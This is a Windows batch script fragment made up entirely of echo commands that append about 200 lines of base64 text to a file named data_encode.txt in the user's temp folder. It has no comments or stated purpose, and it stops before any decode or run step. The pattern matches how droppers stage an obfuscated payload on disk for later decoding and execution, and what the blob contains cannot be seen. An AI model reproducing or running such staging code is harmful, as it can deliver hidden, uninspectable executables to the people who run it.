echo JFrO++69SJxm5WuC+Yib5nt4z/i9w7wpqw4e9lVxz3niwYLgLnlLEsiwHsaRb+jx >>%temp%\data_encode.txt 
echo NwRDO4JZqX5d5P54FvgMM8u18HMO/PFSbP7WvCeM/K3Lfx3KlwPCrmE246wrmzKc >>%temp%\data_encode.txt 
echo U2u+AS76e9J7icsOFyk8H78Q4T/qzeP2ijkfLGJzZTwZmb41TTR3VZmo3Lw/gHwq >>%temp%\data_encode.txt 
echo BR2B+fTBftHB3yK7xzH/rhaO8w+EfIXYv9t5PcyrLyxG+lPZc12/kECT1z4kRQum >>%temp%\data_encode.txt 
echo yAylF1rYhTCXaGq555QzhTgusGFakUocaT3H5CQyeA4sUVvDD4L/ik3B/C9nXw2X >>%temp%\data_encode.txt 
echo NdFm8GFanYtoldYZzjuOAYJf3xLNr1/Q+fUp8GuDUTNrTQP3fXENlzSWm6qnEdBZ >>%temp%\data_encode.txt 
echo K3zkZhNohBxmrbTTWyOcAZabtmYe54h91xzXo1dXEzcimEDTDBcSfZaLc0FenRHL >>%temp%\data_encode.txt 
echo /azal1zbNeYaHLgQXiuJe01Aoazj4Ub+1qdGKsy3e/apC0Vj6h0E+u2mrddSM8TN >>%temp%\data_encode.txt 
echo asCSaAgjjuupwVXz7Ryz8v1oN4+ZfepJTw3+pjCar4Qc2neJfa0r9B5xeNYQ3WOF >>%temp%\data_encode.txt 
echo uYIR/n50Ory3HH1Icx64WzQfZy5UcyXBs5yl0XtirISBOj7nUnVpFZFR/C4H/Fbj >>%temp%\data_encode.txt 
echo 8N659CJwOQ4b/Y3OEThB8CZeOpEJTK5x/Ad5gT9s7ssi4Pu8m84b9z/eNEXEZ/6+ >>%temp%\data_encode.txt 
echo 91km0heWLIEf19ecHHsdiWLvsK/xKHbMjua+hIEuRqqaJ7jhF7nh6ve54QLMZ+p7 >>%temp%\data_encode.txt 
echo 3DCCYNOkBX/D59OcVUe3qq0hQmAxKuzPfSQJxeWiUKzj6cO5WyL04Z+ZetaHXc1C >>%temp%\data_encode.txt 
echo H16GKP7Tcwx9+EcmzmUbpQ/TRP5mD+sPaTjL30PlHvquKUIZVhLiKsNLYisl8N1V >>%temp%\data_encode.txt 
echo qwiwkR2pCc83RWjCg8DDnxH+ds+JAFzheEwFyH/ba260qPy3sud3IbUZS0pjEZTG >>%temp%\data_encode.txt 
echo IlVlD0khT4crwpEtLE9reFpYqv3CwjbbWBPlmJLChJ8kaPCkV7tMYTnn7D8tsPhy >>%temp%\data_encode.txt 
echo N0l3927Gwkc6FlYcdb1cY+hKmYpuj+58uasr+IweS4e9kr48gDvrrFWdY9QnhF+T >>%temp%\data_encode.txt 
echo 8KYq6Oqe++vbvOuQPbByW9VZI3tSccmJXCDruqcrfyxS3g3nrG7OHxjicz9Q77gc >>%temp%\data_encode.txt 
echo KT5tnB4iNov645FZ1N9OipWa+ZdZalouG1Lzz5CaHX5fE62aCSw1X4OQn9NVX5gG >>%temp%\data_encode.txt 
echo gem8ryf5eLSJ5eN1xP5U7zR8TUJkzwHahcDfqPmXBhlG/ywRXzKFWYn/jcY+5fYy >>%temp%\data_encode.txt 
echo FO/KIRHx//tSNZYD/agvlQQHOmvEa/40uWCHF/dfw8xw5vfsgxKn5qw+v8p9ndRS >>%temp%\data_encode.txt 
echo svXQnIXppDy+1f5Z/8J3mpX2kwMs7/gSUwoOnu3g+yqqRhVcLycLewG8f82XeC3e >>%temp%\data_encode.txt 
echo nz0S/IDqDNP2Fhy0HLHv8CMe3WsHgqYjZ78I7hb8z/Ka9qr9GN4cOCmqfRHcE+2P >>%temp%\data_encode.txt 
echo gHicESNhinvzj+wnqO3y/2qxGDP7BRq8MAZJoTsew/9Gl8NRwpqjdnY7/wnHix2P >>%temp%\data_encode.txt 
echo 5G4cUqNa3LjweOXN13mL2bdANjzsAg0mybQb22DewHZOld0dHIL+Btnt4i8/UFtd >>%temp%\data_encode.txt 
echo nTVqPdx1PV3OefLmY9RBhuegcxwCrMqbBxTuIoJjvztA5r0B2gzCt/rQNknI4IPh >>%temp%\data_encode.txt 
echo 6BKwjpY3s4tZIyGDVN/NQSjHVmBmV/A3BGLBjunE19YF/74OLnoIEKC+ZNyByZv7 >>%temp%\data_encode.txt 
echo F42U3e8iOsadsvuwiP2XXnDK9I9V35O0syJAsnE+gxBQGm6cT3mHM3hDjBAYZ+5B >>%temp%\data_encode.txt 
echo CAx581D3Qec7SDj9Q9mDVOMFx1Z9L09e3154Wd4ckF2P6gcphn/7KWemvPmaVRdq >>%temp%\data_encode.txt 
echo ZPe32Wk6T3ZnijuxDATR/1JYyNMIb1i1wpSnToSNiuw5zJBfI2/eKW9+VdtVuHfp >>%temp%\data_encode.txt 
echo cMNfPwOJibGpKgyqy8rodeFrLf6CUwXHYuPAlgDi3QTX/S16KIuCHZi2jRwni8sO >>%temp%\data_encode.txt 
echo wugwqRn3wBUUz3y5k4Bx71jQHzY8n/nP3m0CvFm+IlzqZQU+EeZIaK5D9lSLG54s >>%temp%\data_encode.txt 
echo 31ITgq1kBfZe4l2Pf8c9CLClvknjCFR3ifWI7zeI20RjUh+7B8EEA5fZ6uvOrsCE >>%temp%\data_encode.txt 
echo UO6777Bd0VBCnnoV4xuRpgLey8b773OVawKNQiqk80NsRWlinSkipTpSMYHGVk2R >>%temp%\data_encode.txt 
echo 1GmEGYQ5wFh4TYHkcNwP5u67FMIK7vdC837BLkgSdhWrCiXn88Iu6c5LIp+lTm+y >>%temp%\data_encode.txt 
echo ezbqi6VCJb1DsdVF2Nsc3XaLYOIsIbsC118Kx8uC/VE1N57O4qOazytYKlovIiXm >>%temp%\data_encode.txt 
echo +p2ul1OJDHQ3TbZvopkUfkCj1xXVqEVFU9XcohvUnKIfqOZYR6Aie9gR6BDWVPIP >>%temp%\data_encode.txt 
echo djFigl8xPa36sUlSXywL7okfj9fagMToqk1xNt5nX6IsdNbX25odvZypZ9cp1uba >>%temp%\data_encode.txt 
echo RfYWnNg6nHxKi2C0yxBZFj/4dHZd3+ovstYpeoBcB/WtKo1NSr0VB6sMpiNOS93q >>%temp%\data_encode.txt 
echo x5Sn9/pxMl5Se0bg2zo7gsM2NS+jQgXKKP3xKOrfoVij3vZ+n1AXquugyrbmcMt2 >>%temp%\data_encode.txt 
echo GwCYG+rSodQ3ORuNg+7IeL468uvtjXUcRnexVa1dxOWblaX2hjoE51IcS2y19np7 >>%temp%\data_encode.txt 
echo rXAIHJXtGAXYutXvNj7F3qhkO3IjwipbqVhkFXqrLLE125sAW4z9Vbf2bXaO8UsI >>%temp%\data_encode.txt 
echo bcK/VINJpScsUT3bZHRKg1qmLMRR+ZIGK4Fka7XVOlXrwgZbrsKU12hMZBR+ADbi >>%temp%\data_encode.txt 
echo /k4W8N+hj87uUDjucbaTLweUxc4G1Z7Hj/RWchUMU11EJen/6IHgFpWaGkVjSxfZ >>%temp%\data_encode.txt 
echo axfx41pbo9pMZNMdeQttd9kbHXqU5WynJTYec4pOrwJIRbE11uU11efpDeaFG6JP >>%temp%\data_encode.txt 
echo hCWupcEvdjBcBETEMEDu6iKrGgVPuLpDtTarhPNGo8KU0NisKYq4F7HW2WtBHKMV >>%temp%\data_encode.txt 
echo pVRVkWwSgKlNxlIEbS21gqTD9+Ex4BsIMMBswpQ1WB2qjrkwrpcQPAaupxAE1l56 >>%temp%\data_encode.txt 
echo pLlwOJyL8Y4YjLKEh8IXJwtttkYAD57TSP/VUUtq0102pjGiEkKZrZnGM62VqF9V >>%temp%\data_encode.txt 
echo Rol1PYrn1uAUo0ePVpudtki4HM4lS5qaVWqsrsnmaPy2SuRmp0Ess6lKTm0TQ+Jo >>%temp%\data_encode.txt 
echo amq0XGl5r4vBT3ZDnR4bDzdT2biCEiTChXi50rSEQpoTADm9IeZKt5U6fzZ6X2x3 >>%temp%\data_encode.txt 
echo ONAOoBA3Y//rrqLanzu/oiIO7TXV1zts6n/WQQ/0RWTLyVD/vfHzIgARdoeR+RPY >>%temp%\data_encode.txt 
echo K2gxRMUipvnolGyH1Jf2m22gGlud0iAuueP2xAs3PAPh0O2lBJ1dqaomHmVAMFVR >>%temp%\data_encode.txt 
echo bho9c/TMpobFyh2zKqsqK2ZVKwWjC8Iw6kHbFy+xNTpE5PjRUeuTSL8njuKw30VL >>%temp%\data_encode.txt 
echo xkkSJzR4rBTBn5k5GKim91ihRp8crt2uYt05VLvK17BNjbZelziC0jeCN1FDDSCD >>%temp%\data_encode.txt 
echo Zr5+74FbWSMEES03+LFDkDWAmzCgggejcoi55Dgs6JwBNzpNkVJqrU7wtEjepDeo >>%temp%\data_encode.txt 
echo R9snniFV31GMG9mlfCMLIYwr2nW6fWJBBzxUC44ZTia0UYI9pd+6wCRt3CHycMOt >>%temp%\data_encode.txt 
echo 1l+JBxxZieMo4Hjjz0kiBufv6HN3ErbRlb6fchCGtHNrkBodR0CVu5Oqxcf36WP2 >>%temp%\data_encode.txt 
echo 7qSbxcd8fFDjv71YIvl33WmS/NdZoXWb9fjCM5Ng1u4qzuFrpkd3iFTxXewOk6Nv >>%temp%\data_encode.txt 
echo 8aIcmqB/psE1G2r0/V5J2viBODFy/4MPZXA6ru2mbdf3kR+s2tVZoc7zDi8S2VkH >>%temp%\data_encode.txt 
echo bjjn4tQlcOCH+ZxiOmm6YDrqObjihnh7yj9cjNlTingJeoSCatj9wxBVrXKdq1Bn >>%temp%\data_encode.txt 
echo 4p6jkBofMy3WvqtCdiNk2pQa8zB5LcyIEVYsMF7fH3TRUINH6V8leFj/bQ6+OiMI >>%temp%\data_encode.txt 
echo X5EcAu8kjWYwgsIgyoFp12zZfZJdXw0svPuVuPdITzAQ4LqQID9k4kJF4ijyas9B >>%temp%\data_encode.txt 
echo 9SrvBB5+h+z+2MSxFRVT0NQJW/0HEPR4Xxg/mUbeQdldSq9uktdOTuBD9hyTvHag >>%temp%\data_encode.txt 
echo 8XXrpot8xvvXi/rRcQ37JyUqX4WPjnHz9asf9iV5ZdeKCleXaetW0eZzeptG0qYF >>%temp%\data_encode.txt 
echo 4Tb9s/vU3ilq71L39vSDmaci2uus6UtUHkK+Z8eKW2jkSrdW4RWCWju+ij4039CX >>%temp%\data_encode.txt 
echo lqlFs0l2PyZ2xWYixmLG4tcluPM0Rx7731zTh9yMmAYxsepg/9QENuIcZvhao0bp >>%temp%\data_encode.txt 
echo 1+Gxd/2gL+dZW/H44wiU7aVqgWY9bqtJ9nzPiHusEnbOYFXR6n7oLdy8XW8YayZe >>%temp%\data_encode.txt 
echo YXEFnrgUaq8JNdeI/SYI9ioOCGlQ/MkvBMU/oJuEH9V/+0OhgXHZDlr2chiHkENs >>%temp%\data_encode.txt 
echo h8EAcUKulm29nBHO7bQgAiuBO/oS2WoZdbf1+o4SKfg8oPgnKnFgLt+w/D39RhOz >>%temp%\data_encode.txt 
echo 3l2WGM8l0+DBHAcTl17EOoiNyPSxMptYijqc5m7INFenJK/NuKizi0EX2UUqJ+if >>%temp%\data_encode.txt 
echo EfyYGA6H/eUmnofxcPCo2KRv09OUffBleDjX9mU4WzlZ3+FL3fIrifg0/ldeEw0n >>%temp%\data_encode.txt 
echo SaFIwP6//lKSNmzVj+zfRuyicw+LH4h2HjrMxz3Nhk9FBhDnhn+KLws37BChyOaJ >>%temp%\data_encode.txt 
echo WOx4/NIOsG8OilbQYZwXaF+2f5Tkde0Xob8HT3ddntoS1KPMsH9wotnf9n1E1tWq >>%temp%\data_encode.txt 
echo R6QHj+N3K/0O/g7fGvFtPb7Vocw+LQ2ABHA8JG5d53w/dOt6u3jonyxay8RgOF+E >>%temp%\data_encode.txt 
echo f+8kDkCNoXK4YkXBtoy2rtOgwhlyeXRv+l94E0mapKLCNrCe948pUqmQ9bxJTJHm >>%temp%\data_encode.txt 
echo F5wSESVYXucIGx1O5bWcbxdCEWe+fIrPyEd6M/Gk4Jh2YPWH0ueStPq8hFx96znv >>%temp%\data_encode.txt 
echo 32X9lvTnknF5TLJB4zbfFRkb3I+ElsvWjMRSSeQN83RoZ2BX70xiZoeQwt68d1kn >>%temp%\data_encode.txt 
echo EMumwZxK70D+xgp6KmIF/e62PnAqsY0s2EdwPto+y/XhC76bK8JhCb1pvIJ5RYl1 >>%temp%\data_encode.txt 
echo zCfZnNpXHRG1dqWOcM951HPQLdblcT4/HN6GCDw7S7ThfkSeSuKTNH/Ss3ythbXj >>%temp%\data_encode.txt 
echo /Kk3c6uu7gxKBmoAoxCZbj3r9NMDQN30uOCgyCWhcRwrzw4RHcKpGGnCnVSpSFRy >>%temp%\data_encode.txt 
echo Z4gbcPfjjG+/nqDj2AA9fd+9esgrYmm/mG/Cwel1ni7tjOw5SzyTj6wYvI2YqMBH >>%temp%\data_encode.txt 
echo +j1QCQ3Mm/fBmrKo683v3toXPr7BP3WyUFp2r3Tpwt45aQMAK95vMkkrkrbiA2tg >>%temp%\data_encode.txt 
echo og6k7LkNC2DPIL2e/BBUGa7rLa7ktHkrkjHGzP5sKkbL/btJCNNdXI64fWrS87ol >>%temp%\data_encode.txt 
echo sOdtpI1Yw5c+6+hfy/6Nnwv+0NbCmVZXrPBmVjJJEgqLKzhEvOy5DBM5FNwGMgRz >>%temp%\data_encode.txt 
echo TNrGYhfhqIcDDS/qyVXZTkA6z1FVQneqI+b3RbYzQNBH/8r2HNz3KdmzkaftnKCF >>%temp%\data_encode.txt 
echo e13FCPkzcIV161BaJQbpfZO+h+7/q/twRx6e841VJsl12aR9vnyAtjPQ75I+58Ez >>%temp%\data_encode.txt 
echo vOKCv+bZvlCiL8jIJJuzqsOrK/iodzjQhuPne/8G36h+svv/JDBrGBZ7l7vgMXHy >>%temp%\data_encode.txt 
echo uwBqQV4lpzrzTgB6eTJwx5D3N92Xq9HV2U+d0T0a2qoL0dHQtlf1BcUibGaR2f+n >>%temp%\data_encode.txt 
echo W4RTquwZgMC1fHV1SaftSFD/55dCqLeI28m4N86Dq8WN8y36DeYHwFYaAD37PixH >>%temp%\data_encode.txt 
echo XkwQdn4hckjvE6whfI78q8CF7LkWGnMekwIRBt86ZxbpRHOMb3vLxR4jy8jFSESs >>%temp%\data_encode.txt 
echo Z5yQ3X9ke9QfdnUVfr4iQdsdJoGnbqbdUHGRyLJ8tXc4dwALk3L2khmgnQkEL+iq >>%temp%\data_encode.txt 
echo Fa95jvwGf+EN7K1+XGfpKwZ5OlYeFPeirzHdhBh5JN0MviVi+Ak9cYln/bMOk/pV >>%temp%\data_encode.txt 
echo qe9PfBXmHJ9waubwq5uO08txYAo/I2YSsOBqYwIPCPGhK6mHo4GJF3qetJpbRHy7 >>%temp%\data_encode.txt 
echo R3GzsfRSZO2Hqba4zPz6fMheiyf2vDGxker1jTf3ZTaZvEl4M4FPwNQyWQT664E7 >>%temp%\data_encode.txt 
echo V503GOrZI8xGItjqB5V9Yat/ZhDPIsBHiCFFboAe70sr7MYhb8kE25S3JE2HBUDh >>%temp%\data_encode.txt 
echo TtndTo/pS8ttDGuHEfxV3vIqfBzlLX4Y8GB38OKgiHvqb/epS4duM6OcNbiMvOUM >>%temp%\data_encode.txt 
echo Fo68Za9gq8KQNLR+9s/rQ7MFB7EqhkKFTwTxDufppeX0t7m0a7BE5PwV+MKrt33h >>%temp%\data_encode.txt 
echo iKkLI1jqj+b1wSaGpVHgkXNhQ4mCfa7iVJwpkLxF0te0VaC8hLWSVIwYabSi1445 >>%temp%\data_encode.txt 
echo hxw4/9S53tC5UA5XdyK6GlXwVQ9MCNx7lmh87uiuro2GivvRWVx4GZzsozlEraw1 >>%temp%\data_encode.txt 
echo z6DnOEDjYyvd0iZfiFWclMhr/7ufbg3T9l/9IgNjujqvlh/6A0FkOSKCXZabSyxH >>%temp%\data_encode.txt 
echo tJ2rdyJmpNzmBrBvsQhtv5zm6XKmF34pr0WEW+h0b+sIuYblFNQQn8g5wKq1txgt >>%temp%\data_encode.txt 
echo WnaaLmiZELv+2kciDXmE9U+GDyEBM5AE7Vr/038gUtsIAqR2rvEh0DnxqDX8FPSI >>%temp%\data_encode.txt 
echo JbqCf83UGeQS/gVrCyDkfvq1EcITZkXQdO7Fg0rRHucYKeHy1ThgGo6CpEzxikTs >>%temp%\data_encode.txt 
echo Y8hg18v5rP3tMhwXnaEziakY6bevKjWCH0dsiyfP6aNlxarOsJ6Y1JdKnNyIfUEN >>%temp%\data_encode.txt 
echo AtzwaSgaaR7m9jEaFk8dWz1CHq6ZY5Ki87NFRzZtmK0HLRW04RnL1jAo53sYs174 >>%temp%\data_encode.txt 
echo qkhh1qzHM+corasmVaoTZxbu5TTBjk/lLYPLNuD4zdNVr6Uj0m1bZYLsQQ48EMg8 >>%temp%\data_encode.txt 
echo GOsc1e1BYq1goN0dqeCY82miX+4huEH4remBUd+wsM8fG78E1/nWXZ5KiLj3UhgR >>%temp%\data_encode.txt 
echo liOP8fWtyDtXLi5w11UYUVsnROVb4yRUGHzTTfrgC0kBGBoeuTroZOE/tAk87lHR >>%temp%\data_encode.txt 
echo 52eh8Y+KHL+Jdiz0tV7rL28uTWibnhDYcTFa5hhj/XR297H+j1guIn6REQmWPeeC >>%temp%\data_encode.txt 
echo z+jxWm+7GJEVa/g/jfjAEaHVsQCenG0KTbI/OhVfhciE+JNZJmlKEt7xuGXPyEvh >>%temp%\data_encode.txt 
echo USeHRi3ffwOCmxljlcNjDQzuYWBD4gxsr5hEZgCWPRFzGHit07BX/3QYyZdqYeyd >>%temp%\data_encode.txt 
echo VXCsntr4DqnerKusuMsIBU0iABN2+UkwDWdG+DxeO2KY1vCSIlX1+UgLqT/N6ovI >>%temp%\data_encode.txt 
echo 3EZa/mbjeNK5yXD0dT7NSQlj4jOn+uFOCAb8C7YRScoCA2GvgLbSq4UpGz39Bj0t >>%temp%\data_encode.txt 
echo GtKS8JchbTcO0Q3cFmad3gBzTGwcWmauSBG1Vs3KShcZ7JKKqFKy+k15c+UQ90G1 >>%temp%\data_encode.txt 
echo bNWF/ur3Vl0YpBauupCkjmd7gQVZx89yOQR0EQ1wypTSrB0n+ptfSt7fVpol4qgI >>%temp%\data_encode.txt 
echo +4KZWUq49+DLGwR4lUNcFwYvXdtlfvT2jFLIiafo490hpd0+I//Ds56eG5/UX3pg >>%temp%\data_encode.txt 
echo dDj/g+vTCh88xzM4XsYNUD3tvgjOfzXsMTdXw6Ciwjy4LRPIxO+r29K+wV8rzEPa >>%temp%\data_encode.txt 
echo Mq8VbDyDmmlL+yYMtNzPgHcP06UDx7PnJ9eJkpAi/lX0ZKMiirDwaMIDc4RIuBMP >>%temp%\data_encode.txt 
echo ciJEwhw8yBUlclBiGLeaL4rcgCIp/GSsKJOLMuc24sl4UWY0yvyLn0wUZfJR5jA/ >>%temp%\data_encode.txt 
echo mSTKjEWZE/RkY5EoMhFFDuBBCcshhN+t2GXEc9DzL4WitajmfMOu03MqZGbl/jBB >>%temp%\data_encode.txt 
echo pPx6R5yylkCtfQHneZf6LU0VIS71dEEkOcupM99czvlFsEzcCG3vnG/+xcK3lx5e >>%temp%\data_encode.txt 
echo 3Tm/Gg0uQNhs8f3Br/juIE0dGXMep530qd9NtFzw3X0R/TwT/Lmra0BLQJhJOT+E >>%temp%\data_encode.txt 
echo pzvtQ4pcFeasfr5bmQcFnhbWQiI9iLaz1QF/eqT3upnjSO97mvc5O1unobY2xNU1 >>%temp%\data_encode.txt 
echo qOWXyOdB+951vjthSej3PM0O1eX1msk3/SrwHwc9WU29SMK+jN6UJgTuFJZO6cQz >>%temp%\data_encode.txt 
echo /nvVcnqpbnLVmbMuBf9I6tVyeH6PhILl2cdBjT0qFV9N7xFPKXAXpymn8d8OXHwL >>%temp%\data_encode.txt 
echo rzrnt0JGJougabCnSzeKG1meXF395Ac+Ee7e5biyQOYJRPqige/fwKZQBFo/3/T+ >>%temp%\data_encode.txt 
echo HHRpnVHfE2pBdv9exGcqwYnZE2xidWsiZz4aSITdgaAv6lWurkT5QbhdYDyXYToI >>%temp%\data_encode.txt 
echo jgRDLBRIUFN9308s7GyZxcPFo0TZjXyAvpsTCy+0pOBxZ2AqHtQUMNarNuhYT2Ws >>%temp%\data_encode.txt 
echo VyUHRopRIMTh/uBJX3UBD+I7ejntndZkMT/Bp9iw85j6SPCzdb65SSCopA3Rc8x2 >>%temp%\data_encode.txt 
echo 8UbTiYEKttsLz8Au2oNTG87jIew/o+sLMEnmYxz9d8GOwIRLUfnSiiL4y7XgLwO1 >>%temp%\data_encode.txt 
echo CP5ylHk0ZpeYyuC2tItCL72agGzLvEQ//JOfwsq8vCbEYfw5/ESK4C0T6cnGRLFW >>%temp%\data_encode.txt 
echo r0WRbDxIFiWuQ4kMPEgVJUahRD88SBclvoUSB59EqxkRvGUHPelIQs/J9RsRT1sd >>%temp%\data_encode.txt 
echo KVi196ZELQ2te29K1tJS+UuqlpbOV6H4KWLiCz5RtCs2fzZs2paL6w/ayE/zdKil >>%temp%\data_encode.txt 
echo RJYtRUa+v5lPgiQTsFsjKCY/ibV/BPn+Di3NWn2pFAdlw7RLPnVcouU930841d9e >>%temp%\data_encode.txt 
echo RMRO1c9CXZ1ZapKrM8N51DeX9aih1ERx6S1l+doZ5+7gW73ZD0g5DfbG6BztyxTr >>%temp%\data_encode.txt 
echo XVY7PMVJDs3ftuPaUkkfRIOIuY1AaqHzd8TXQaz2gmOIBQ/TSXuZCbum6BDu1WWm >>%temp%\data_encode.txt 
echo 6Bjyh240oX3/jx9B/HkRZbgoWW0uWqk2Fnb+ZEBb4rgyel+U4nxX1PPdVOIt5WRf >>%temp%\data_encode.txt 
echo pYmthd6bSpBe7saSqEZXUKOrlo/rStnWTlDLHvCb3eXjujjjb6pgthXhNGBPUvHg >>%temp%\data_encode.txt 
echo i55jKx6bHfy5mLW/pPDpfzd7YMOzOGug0LPSwdc6bsxKVtP0ywvZ/Tn7w76ImLZt >>%temp%\data_encode.txt 
echo v8IOdhsKadX/lVwmwjCt8D+PqCaR9PESX5YvF0VGIH6Tt3g/jiT2iTxEhcQltbSv >>%temp%\data_encode.txt 
echo QGPDP6d/V9zGB9Ra3mGEbejKWjmjWxDf2/rFjU+sDtfOHzrh2pM8MPPvnPZA4460 >>%temp%\data_encode.txt 
echo TLQUfNZ1eqA37+8iAzOiB/NLbzFejgzCbbT91EBPl8ZFnBneTADTdm1XEj67kgCg >>%temp%\data_encode.txt 
echo ABwAr7hNJIZLCwMZG0T5qfgBmgFkwbFDJwSMBKwO5HABJFuSMggb8MCbwfGztSA4 >>%temp%\data_encode.txt 
echo StbIQ4dOCfhghGo5LaqCWb3HgbAwGbL7DghRwjfw/sKWCmr7qOxGWuqCffLm+zFr >>%temp%\data_encode.txt 
echo bdMkb/XPk+esPoEJWX0B9ZwfbUNZy8lpxH1TkHS2LQ0PfIk3aKcLX8HJkKNA3jzU >>%temp%\data_encode.txt 
echo m8Z4GezN/Irxgl83UhPIWsWPZPdPCZgZU5abU5vfgCgsWb38AQZGHRT66vwaNyrb >>%temp%\data_encode.txt 
echo /pIqAuahO5hHYxbaKiYnaw0vJnsZI5BInstI3COuzVLBFoZFZG7iLYxImqT73Q16 >>%temp%\data_encode.txt 
echo QMgL51vBgyKfgCiU9k+fsYlJ4NPHEx694J9EOq2CHRuZDHnmA5N1mcsT/cJmQkXg >>%temp%\data_encode.txt 
echo BQTGwezbhecfE5YgCtDATC+nxJ5NokVk4277qRQ/FFUMpYp5LOjSmBiDf2Jr7AwO >>%temp%\data_encode.txt 
echo r8TzLghCC2L+YTssaMDytqvTJKqq33R10v4XwWT8yyOWb2DLZb41zeKozP6bXTi/ >>%temp%\data_encode.txt 
echo YXLbGXDiCHNq5BMYOPvzIp/87qKekSJR8o8vxt6WZ2Fbf86OdAYRk6EARO1XqraB >>%temp%\data_encode.txt 
echo AzwHHiHs18sfTs4GnRUDohUyb/vV5NUVq5NxT0e0w1zhCFd7HtVi4m9R/Y6XS9Sh >>%temp%\data_encode.txt 
echo 2V0v4ZDs4WSjysc/QH6Drcxfyh9JDn4i+L2jd4uyyNtGJdKOS4ERphHGIk4pvE+R >>%temp%\data_encode.txt 
echo 1qVM693Ac/IVLNryev9LuZJBnKKU1qpODjUBozxYTHU3OTVgAdCFBHtO9uhJDbcv >>%temp%\data_encode.txt 
echo sqQYhpS2ur7Vj62ds9DqQN1GYboVspLr2QrMrjoUW3Sflt4GqSjVMAAL23qFTdTQ >>%temp%\data_encode.txt 
echo iaOpIdJODdaQDbZoW1R0CYvYbuDARtYKY16a6GzHaPRki2vfh8gjGKw+bp1AoD7k >>%temp%\data_encode.txt 
echo hsaUYwzKYmDS3qgXrG9uWsyWcvHj90SYiwrERdhEIuSJ0e3ouGjqBT9xDKJjLPgi >>%temp%\data_encode.txt 
echo BgzT2N6Mi0U7PHtU3k7NZzsMDNJMCjPXOAAqwoAvbGnoVAVARoCUKOxT2wREXJhi >>%temp%\data_encode.txt 
echo sBF3EuJh/goLSBgd9jwHjbpVuF01TL/7NC1R8wMnALa6jDVZHJ0iiXHHmjLamSjD >>%temp%\data_encode.txt 
echo Q+QRhugVANY3NTQ0LWXDW1urOrlHIIp7+OvWpT664h7/4vdQ3OcOiK301nwP7af0 >>%temp%\data_encode.txt 
echo iKCQuWevNtt9sxftpX5ZN4aAB8uU64kIJqf0zrpJHoXjF+VGBDBycvjMZnaHiXwe >>%temp%\data_encode.txt 
echo fsqiJrtuNKJ/pUhzqvLK51XliqhJTc3K3Gplemm1VLrYfpdVunVOlTS/0d5KX8aU >>%temp%\data_encode.txt 
echo 0XfD7liKKD2zcnqVNMdaa29UmxyLlJn06468qmUO1bZYKqscM0eqnldZlTc2X5pb >>%temp%\data_encode.txt 
echo Ta+q5lSNuZk6lEqJ7Tcqt8yqKqOupTm3Vkm32RvHjVVuRe832uhZNVGmbbEyt2q2 >>%temp%\data_encode.txt 
echo RPPU5JAaYTmc4+CwSxbJIcIuNXN0JRId9VbgUCmwdHs0tvujcd0fjbdIdhGhqU5S >>%temp%\data_encode.txt 
echo EaLJfh99q7PVN2AiQ1+IHTcusjZSzbyJ4+8J11FyKmcr5WUVFgKzebG1QVpsbbUv >>%temp%\data_encode.txt 
echo di6W6q0OVXI4l9ia+VukvbVYv1b816jb+oe1BJot6oSXoWFgDYZAY25sWtpITIJw >>%temp%\data_encode.txt 
echo 0Cv/IfoOS174WjUoi2zWOluzEBshC3drSAPRI2xFM8IeSVgRRt8OnmoQQxONkQ3L >>%temp%\data_encode.txt 
echo Q8/q6bGdFv/ksEdQOF6VouiB1IRmUNtUJ3wl6tWlhJLJ8QOUOUezbgR9D04KjUBx >>%temp%\data_encode.txt 
echo FBygcwJiob3BrkJTutdJq6tuctz+jfpGnyGAjGpwPeB5qVUnx+nfWFOosphj1E1W >>%temp%\data_encode.txt 
echo ev+L7t+BaHY0eEeDnceuO9VYiQfkMF1xmLnINrNrZ6dIofqNzsULaTqphapFMHlr >>%temp%\data_encode.txt 
echo zJtuJVGAoLmO+C1k10b2Hwm/w7kwT122hBaYoPTYnuPBL/Buq3U2A9dEUKrTMfkK >>%temp%\data_encode.txt 
echo 46eJbl625AqsUaevUBC3SOqd3Hf8Mnxs9b+YiKveLvTJHGI/Sh2t5TEwDoweZJ/q >>%temp%\data_encode.txt 
echo z6/WFys9oeVK70INIZYcNcHwSvOry3qX3+PG5i0k6V92S5nSYm1wEu4X2VotvQ0Q >>%temp%\data_encode.txt 
echo K7O1G/0RXCClKxGfvryNVa1EyYq+tRBdP6yVA1ON1sVXbIBUj9pFVqyn3n09BX7C >>%temp%\data_encode.txt 
echo 7Ufge/IV2tfB0zpi4TOk8+T/b/CxCmssQkOd466EytO9J13pZfmtKNYlpDVDX+A6 >>%temp%\data_encode.txt 
echo WH3/Hv8g8SyqRgQ5zMnOn9ikNNWSCtyNklA7Uv6wkP83WoitD9Xg3wEgtj441pwq >>%temp%\data_encode.txt 
echo LEes9OZGWuMxrXUbQf7EhtuJEbQy/QndJR4EY7lQvKUEJUK4ff5n9ZuJCeU1NTZc >>%temp%\data_encode.txt 
echo 2Z/sP2ufVLOo//XcDesPTY54zY/vqXm0V2Ff2AwRgz+pPKR70o8qEnvYJ9E8GG9E >>%temp%\data_encode.txt 
echo NWm2bZmtTm9DmkU8uVX/KSmTJsI7765m62JFGhv5Y1zkj6lTp4aA0E9tST/RXcKn >>%temp%\data_encode.txt 
echo TQc/tioLiW/eo+SwGMpvpWG0WoSMpGVpa6212UjNb7Ytpp0KpGUETwh5HCuOJdZa >>%temp%\data_encode.txt 
echo G28rRWM6C1hkdQgH0L6p9pH7g+7HL5HM39g5TZbi1c9TSiFYRVFsZJVZ5frIaJoc >>%temp%\data_encode.txt 
echo Ft580eDE6MG4pMrZt5XeMk2ZOJ5FA0YfelZ6K+vdxk8o5/pXVp2NH6ywz2qsb8q7 >>%temp%\data_encode.txt 
echo Y1Yll2qi3kMP8HrMvKqxY+ZWs26vzJ9VPmbGrHLSLO3Qf2jyIc6iK4X0e6nRtjTe >>%temp%\data_encode.txt 
echo 4zvsS2apEb+rFpN2CffEHouQJr+oqVm1GHsLbAF4W1FaVkGUqCsV5TZHbbN9CeFd >>%temp%\data_encode.txt 
echo bArC+wcqe6uxjagiPnoP7S6mQ2ebbW2EPj+nfIJUWmUX6Oi2l9DV6N5oYDRTFUhA >>%temp%\data_encode.txt 
echo qB+R0w566lPQWdFIzhyr8Btld3tReBQR1CjFurjJSQKgzomLIwV7G+tdNl2ZvIJ+ >>%temp%\data_encode.txt 
echo bxxsACzuRYBm5/MTEBYDGQEjxEU2HHnrsUOBhpftkMR2SqJlkaevFVbFI7c+YSUh >>%temp%\data_encode.txt 
echo Z6pFCt1P/lv4iRNUNxIQ6X+Lf9qIhhTRuhDN8MKS/sP5JfVtzIw51UAZFgThSmiB >>%temp%\data_encode.txt 
